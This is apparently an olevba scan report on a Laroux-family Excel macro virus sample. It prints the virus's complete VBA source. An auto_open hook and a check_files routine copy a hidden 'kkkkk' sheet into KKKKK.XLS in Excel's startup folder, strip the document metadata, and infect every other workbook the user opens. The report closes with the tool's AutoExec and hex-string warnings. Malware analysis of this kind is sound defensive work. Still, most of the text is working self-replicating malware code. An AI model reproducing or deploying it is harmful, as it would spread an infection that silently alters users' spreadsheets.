olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO kkkkk.bas 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/kkkkk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "KKKKK.XLS")
    If m$ = "KKKKK.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("kkkkk").Visible = True
    Sheets("kkkkk").Select
    Sheets("kkkkk").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "KKKKK.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("kkkkk").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "KKKKK.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "kkkkk" Then
        Workbooks("KKKKK.XLS").Sheets("kkkkk").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("kkkkk").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "KKKKK.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï1.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï2.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï3.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï4.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï5.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO âéìéåï6.cls 
in file: Virus.MSExcel.Laroux-based-42db9a87f2bf66c690c463b9ae69c97bd12f589a - OLE stream: '_VBA_PROJECT_CUR/VBA/גיליון6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  kkkk
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  moti 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

